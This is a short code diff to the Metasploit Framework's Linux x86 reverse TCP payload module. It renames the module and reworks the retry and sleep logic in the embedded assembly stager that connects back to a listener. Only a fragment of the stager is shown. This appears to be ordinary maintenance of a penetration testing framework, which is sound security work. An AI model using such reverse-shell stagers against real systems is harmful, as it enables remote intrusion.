@@ -14,7 +14,7 @@ module Msf
 ###
 
 
-module Payload::Linux::ReverseTcp
+module Payload::Linux::ReverseTcp_x86
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
@@ -123,6 +123,8 @@ module Payload::Linux::ReverseTcp
         jns mprotect
 
       handle_failure:
+        dec esi
+        jz failed
         push 0xa2
         pop eax
         push 0x#{sleep_nanoseconds.to_s(16)}
@@ -131,9 +133,7 @@ module Payload::Linux::ReverseTcp
         xor ecx, ecx
         int 0x80                   ; sys_nanosleep
         test eax, eax
-        js failed
-        dec esi
-        jnz create_socket
+        jns create_socket
         jmp failed
     ^
 
